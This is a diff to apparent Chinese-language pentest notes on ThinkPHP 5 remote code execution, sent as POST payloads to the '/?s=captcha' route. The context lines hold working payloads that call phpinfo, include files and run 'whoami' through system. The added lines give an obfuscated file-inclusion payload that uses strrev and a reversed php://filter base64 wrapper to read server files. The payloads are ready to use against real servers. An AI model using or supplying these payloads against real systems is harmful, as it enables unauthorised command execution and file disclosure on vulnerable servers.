@@ -77,6 +77,9 @@ post:未开强制路由，或利用变量覆盖达到命令执行
 /?s=captcha
 执行php函数：_method=__construct&method=get&filter[]=call_user_func&get[]=phpinfo
 包含文件：   _method=__construct&method=get&filter[]=think\__include_file&server[]=-1&get[]=根目录
+            _method=__construct&filter[]=strrev&filter[]=think\__include_file&method=get&server[]=1&get[]=根目录倒序文字（txt.1）
+           _method=__construct&filter[]=strrev&filter[]=think\__include_file&method=get&server[]=1&get[]=
+           txt.1=ecruoser/edocne-46esab.trevnoc=daer/retlif//:php    #包含看文件内容，base64编码预防编码错误
 执行命令：   _method=__construct&filter[]=system&method=GET&get[]=whoami
 
 ```
